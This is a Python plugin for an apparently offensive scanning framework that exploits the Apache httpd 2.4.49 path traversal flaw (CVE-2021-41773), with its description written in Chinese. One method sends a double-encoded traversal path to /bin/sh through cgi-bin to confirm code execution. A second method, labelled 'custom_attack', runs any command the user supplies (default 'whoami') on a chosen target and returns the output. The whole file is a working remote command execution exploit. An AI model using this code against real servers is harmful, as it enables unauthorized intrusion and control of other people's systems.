# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "name": "Apache httpd 目录穿越漏洞",
        "description": "Apache中间件http服务存在目录穿越漏洞, 如果文档根目录以外的文件不受require all denied保护, 则攻击者可以访问这些文件",
    }

    def url(self) -> dict:
        random_str = self.build_random_str(12)
        r = self.request(
            method='post',
            path='./cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh',
            data=f"echo {random_str}",
            timeout=15
        )
        if random_str in r.text:
            return {
                "LoopholeInfo": {"app": "Apache", "version": "2.4.49", "name": "CVE-2021-41773"}
            }

    @cli.options("url", description="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", description="执行的命令", default="whoami")
    def custom_attack(self, url, cmd):
        r = self.request(
            method='post',
            url=urllib.parse.urljoin(url, './cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'),
            data=cmd,
            timeout=15
        )
        if r.status_code == 200:
            return r.text
